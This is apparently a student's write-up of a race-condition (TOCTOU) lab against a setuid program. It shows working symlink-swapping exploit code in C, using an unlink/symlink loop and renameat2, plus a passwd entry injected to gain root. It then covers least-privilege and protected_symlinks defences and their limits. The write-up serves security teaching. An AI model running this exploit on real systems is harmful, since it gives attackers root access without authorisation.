## 环境配置
### 关闭防护机制
![[Pasted image 20261015001039.png]]
### 编译漏洞程序
![[Pasted image 20261015001238.png]]
## 任务一
![[Pasted image 20261015001615.png]]
成功
![[Pasted image 20261015001705.png]]
随后删除这段魔法口令
![[Pasted image 20261015001850.png]]
## 任务二
### A：模拟一个慢速机器
在`vulp.c`中增加`sleep(10)`并编译
首先创建一个普通文件让access能够通过
```bash
echo "dummy" > /tmp/XYZ
```
然后运行`vulp`，随即输入
```bash
rm -f /tmp/XYZ
ln -s /etc/passwd /tmp/XYZ
```
成功获取root
![[Pasted image 20261015003806.png]]
### B：真正的攻击
首先删除`sleep`语句，并重新编译
然后做一个输入用的`inputFile`
```bash
echo 'test:U6aMy0wojraho:0:0:test:/root:/bin/bash' > inputFile
```
随后编写攻击程序：
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main()
{
    while (1) {
        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ");
        unlink("/tmp/XYZ");
        symlink("/tmp/dummy", "/tmp/XYZ");
    }
    return 0;
}
```
运行后十分钟发现`XYZ`的所有者被更改为了`root`，因此删除`XYZ`后重新攻击
一直无法成功，直接进行下一步
修改代码为：
```c
#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>

int main()
{
    unsigned int flags = RENAME_EXCHANGE;

    unlink("/tmp/XYZ");
    symlink("/dev/null", "/tmp/XYZ");

    unlink("/tmp/ABC");
    symlink("/etc/passwd", "/tmp/ABC");

    while (1) {
        renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
    }

    return 0;
}
```
成功
![[Pasted image 20261015011105.png]]
![[Pasted image 20261015011111.png]]
## 防护措施
### 1. 最小权限
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
    char* fn = "/tmp/XYZ";
    char buffer[60];
    FILE* fp;

    uid_t real_uid = getuid();
    uid_t eff_uid  = geteuid();

    /* get user input */
    scanf("%50s", buffer);

    seteuid(real_uid);

    if (!access(fn, W_OK)) {
        fp = fopen(fn, "a+");
        if (!fp) {
            perror("Open failed");
            exit(1);
        }

        seteuid(eff_uid);

        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);

        seteuid(real_uid);
    } else {
        printf("No permission \n");
    }

    return 0;
}

```
攻击失败：
![[Pasted image 20261015012031.png]]
### 2. Ubuntu内置方案
开启`sysctl -w fs.protected_symlinks=1`，同时删除上一个环节加入的最小权限代码并编译
攻击失败
![[Pasted image 20261015012332.png]]
#### 此保护方案如何工作
当一个进程试图跟随符号链接去访问文件时，内核会检查以下条件：
1. 符号链接所在目录是否全局可写且带黏性位（比如 `/tmp`，权限 `1777`）。
2. 符号链接的所有者和跟随链接的进程的有效 UID是否一致。
3. 符号链接所在目录的所有者和跟随链接的进程的有效 UID 是否一致。
如果符号链接在全局可写+黏性位的目录里（如 `/tmp`），且链接所有者与进程有效 UID 不匹配，且目录所有者与进程有效 UID 不匹配，那么内核会拒绝跟随这个符号链接。

#### 此方案有何限制？
1. 只保护全局可写+黏性目录
2. 只防符号链接，不防硬链接
3. 依赖链接所有者和进程有效 UID 的比较
4. 不防其他 TOCTOU 类型